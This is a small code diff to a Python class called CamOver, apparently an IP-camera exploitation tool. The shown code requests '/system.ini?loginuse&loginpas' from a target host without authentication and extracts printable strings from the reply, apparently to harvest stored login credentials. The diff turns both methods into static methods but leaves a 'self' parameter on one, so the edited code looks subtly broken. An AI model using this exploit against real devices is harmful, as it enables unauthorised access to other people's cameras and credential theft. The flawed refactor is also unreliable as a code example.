@@ -29,13 +29,15 @@ import requests
 
 
 class CamOver:
-    def connect(self, host):
+    @staticmethod
+    def connect(host):
         try:
             response = requests.get(f"http://{host}/system.ini?loginuse&loginpas", verify=False, timeout=1)
         except Exception:
             return None
         return response
 
+    @staticmethod
     def exploit(self, response):
         if response.status_code == 200:
             strings = re.findall("[^\x00-\x1F\x7F-\xFF]{4,}", response.text)
